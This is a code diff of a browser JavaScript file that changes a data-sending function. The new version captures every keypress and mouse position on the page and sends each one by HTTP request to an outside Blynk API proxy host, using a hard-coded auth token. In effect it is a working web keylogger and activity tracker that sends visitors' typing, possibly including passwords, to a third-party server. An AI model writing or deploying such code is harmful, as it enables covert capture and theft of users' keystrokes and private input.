@@ -14,25 +14,30 @@ function getIP(){
 }
 
 //Send POST request
-function sendData(f,value){
-	var url = "http://0.0.0.0/"+f+"?"+"param="+value;
-	var xhr = new XMLHttpRequest();
-	xhr.open('POST', url , true);
-	xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
-	xhr.send();
-	 
-	xhr.onreadystatechange = processRequest;
-	function processRequest(event) {
-		if (xhr.readyState == xhr.DONE && xhr.status==200){
-			console.log("envió, no sé si bien o mal o qué pero envió");
+
+function sendData(pin,value){
+
+	var auth = "b8f38de1f8f64b76b4a3dd0643924358";
+	var url = "https://private-anon-7d28ed15b9-blynkapi.apiary-proxy.com/"+auth+"/update/"+pin+"?"+"value"+"="+value;
+	console.log(url);
+	var request = new XMLHttpRequest();
+	request.open('GET', url);
+	request.onreadystatechange = function () {
+		if (this.readyState === 4) {
+		  console.log('Status:', this.status);
+		  console.log('Headers:', this.getAllResponseHeaders());
+		  console.log('Body:', this.responseText);
 		}
-	}		
+	  };
+	  
+	  request.send();
+	
 }
 
 function getKey() {
 	document.addEventListener("keypress", function onEvent(event) {
 		//console.log(event.key);
-		sendData("key",event.key);
+		sendData("V2",event.key);
 	});
 }
 
@@ -42,8 +47,8 @@ function mousePosition(){
 	let handleMousemove = (event) => {
 		//Print positions
 		//console.log(`${event.x},${event.y}\n`);
-		sendData("xmouse",event.x);
-		sendData("ymouse",event.y);
+		sendData("V2",event.x);
+		sendData("V2",event.y);
 		};
 
 	let throttle = (func, delay) => {
